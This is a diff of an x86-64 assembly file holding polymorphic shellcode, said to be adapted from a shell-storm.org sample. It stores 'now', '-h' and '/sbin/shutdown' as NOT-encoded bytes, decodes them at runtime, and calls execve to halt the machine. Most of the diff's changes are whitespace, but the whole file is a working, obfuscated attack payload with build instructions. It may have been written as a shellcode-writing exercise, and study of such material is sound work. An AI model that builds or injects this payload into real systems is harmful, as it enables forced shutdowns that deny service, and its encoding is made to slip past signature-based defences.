@@ -1,37 +1,39 @@
+; Polymorphic version of shutdown code from http://shell-storm.org/shellcode/files/shellcode-877.php
+; Build with: nasm -felf64 shutdown.nasm -o tmp.o && ld tmp.o -o shut
 global _start
 section .TEXT exec write
 
 _start:
-	xor rdx, rdx
-	push rdx ; NULL to terminate arg array
+    xor rdx, rdx
+    push rdx            ; NULL to terminate arg array
 
-	jmp _str ; Get addr of strings in RAX
+    jmp _str            ; Get addr of strings in RAX
 _build:
-	pop rax  
+    pop rax  
 
 ; Load string addresses onto stack
-	push rax           ; 'now'
-	lea rdi, [rax+4]   ; '-h'
-	push rdi
-	lea rdi, [rax+7]   ; '/sbin/shutdown'
-	push rdi
-	push rsp           ; Save arg array addr
-	pop rsi
+    push rax            ; 'now'
+    lea rdi, [rax+4]    ; '-h'
+    push rdi
+    lea rdi, [rax+7]    ; '/sbin/shutdown'
+    push rdi
+    push rsp            ; Save arg array addr
+    pop rsi
 
 ; Decode strings
-	push 0x16
-	pop rcx
+    push 0x16
+    pop rcx
 _decode:
-	not byte [rax]
-	inc rax
-	loop _decode
+    not byte [rax]
+    inc rax
+    loop _decode
 
-	push 0x3b
-	pop rax
-	syscall
+    push 0x3b
+    pop rax
+    syscall
 
 _str:
-	call _build
+    call _build
 _now: db 0x91, 0x90, 0x88, 0xff
 _h:   db 0xd2, 0x97, 0xff
 _cmd: db 0xd0, 0x8c, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0x8a, 0x8b, 0x9b, 0x90, 0x88, 0x91, 0xff
